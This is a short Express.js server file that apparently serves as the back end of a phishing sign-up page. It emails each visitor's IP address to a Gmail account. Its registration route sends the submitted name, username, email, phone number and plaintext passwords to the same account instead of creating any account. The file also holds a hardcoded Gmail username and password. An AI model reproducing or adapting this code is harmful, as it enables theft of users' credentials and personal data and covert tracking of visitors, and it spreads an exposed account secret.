const express = require("express");
const app = express();
const exphbs = require('express-handlebars');
const formidable = require('express-formidable');

app.use(express.static("public", { 'extensions': ['html'] }));
app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');
app.use(formidable());

app.get('/', function (req, res) {
  
  let ipzz = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  let nodemailer = require('nodemailer');
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'wafa.1998.13.2018@gmail.com',
      pass: 'wafa2015'
    }
  });
  
  let ipAddress="IP Address: "+ipzz;
  let mailOptions = {
    from: 'wafa.1998.13.2018@gmail.com',
    to:   'wafa.1998.13.2017@gmail.com',
    subject: 'Sending IP Address',
    text:ipAddress
  };
  
  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  res.render('index');
});

app.get('/createAccount', function (req, res) {
  res.render('createMyAccount')
})

app.post('/users/register',(req,res)=>{

let name=req.fields.name;  
let username=req.fields.username;
let useremail=req.fields.email;
let userPhone=req.fields.phonenumber;
let userpass=req.fields.password;
let userpass2=req.fields.password2;


let myfinalMsg="name:"+name+"--username:"+username+"--useremail:"+useremail+"--userPhone:"+userPhone+"--userpass:"+userpass+"--userpass2:"+userpass2;

  let ipzz = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  let nodemailer = require('nodemailer');
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'wafa.1998.13.2018@gmail.com',
      pass: 'wafa2015'
    }
  });
  
  let ipAddress="IP Address: "+ipzz;
  let mailOptions = {
    from: 'wafa.1998.13.2018@gmail.com',
    to:   'wafa.1998.13.2017@gmail.com',
    subject: 'user Details',
    text:myfinalMsg
  };
  
  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  res.render('varivey');


})
// what does this line mean: process.env.PORT || 3000
app.listen(process.env.PORT || 3000, function () {
  console.log("Server is listening on port 3000. Ready to accept requests!");
});
